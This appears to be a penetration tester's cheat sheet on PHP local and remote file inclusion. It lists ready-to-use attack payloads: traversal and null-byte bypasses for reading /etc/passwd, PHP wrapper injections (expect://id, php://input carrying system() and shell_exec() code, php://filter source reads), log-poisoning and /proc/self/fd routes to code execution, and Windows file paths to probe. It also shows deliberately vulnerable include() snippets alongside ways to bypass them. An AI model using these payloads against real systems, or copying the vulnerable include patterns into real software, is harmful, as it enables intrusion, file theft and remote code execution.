# php wrappers, LFI

## [dotdotpwn](https://github.com/wireghoul/dotdotpwn)

Note: preinstalled in latest kali iso. Works for `http, ftp, tftp`

```bash
dotdotpwn -h IP -m MODE -f FILE-TO-FUZZ -U USER -P PASS
```

## Workarounds

NOTE: **Read the file that is running LFI** to get more information about the code.

```bash
# using null byte %00
/etc/passwd%00

# LFI wordlist
/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt
```

## .php wrappers

```bash
# protocol wraper
file=http://IP/
file=ftp://IP/
file=//IP/smb-share/file

# expect wrapper
# allows to run system commands
file=expect://id

# input wrapper
file=php://input
# needs to send POST data
<?php system('id'); ?> | <?php shell_exec('id'); ?>

# filter wrapper
file=php://filter/convert.base64-encode/resource=PHP-FILE
```

## LFI to RCE (linux)

```bash
# using LFI can read access log files and then log poision
# if user does not have perms to read log files; can do file descriptor way
LFI=/proc/self/fd/{NUMBER}

# once have access to log file > log-poisoning.
```

## LFI Paths (windows)

```bash
# sample paths to test
C:\Windows\System32\Drivers\etc\hosts
C:\\Windows\\System32\\Drivers\\etc\\hosts
\Windows\System32\Drivers\etc\hosts
\\Windows\\System32\\Drivers\\etc\\hosts
C:\Windows\win.ini
C:\\Windows\\win.ini
\Windows\win.ini
\\Windows\\win.ini
C:\Windows\system.ini
C:\\Windows\\system.ini
\Windows\system.ini
\\Windows\\system.ini
```

## LFI PHP Code Analysis

```php
<?PHP 
	include($_GET["file"]);
?>
```

The above code block includes any value given to the file paramter.

```php
<?PHP 
	include("downloads/". $_GET['file']); 
?>
```

The above code block includes any value given to the file parameter as long as its in the downloads directory. To bypass
use `../../../<>`

```php
<?PHP 
	include("downloads/". $_GET['file'].php); 
?>
```

The above code block includes any value given to the file parameter as long as its in the downloads directory and
appends `.php` to the user input value. To bypass use `../../../<>` and value ending with `%00`.

When there is substitution for `../`, bypass using `....//` as it will convert to `../`

## RFI PHP Code Analysis

Requirement for RFI to work is `allow_url_fopen` and `allow_url_include`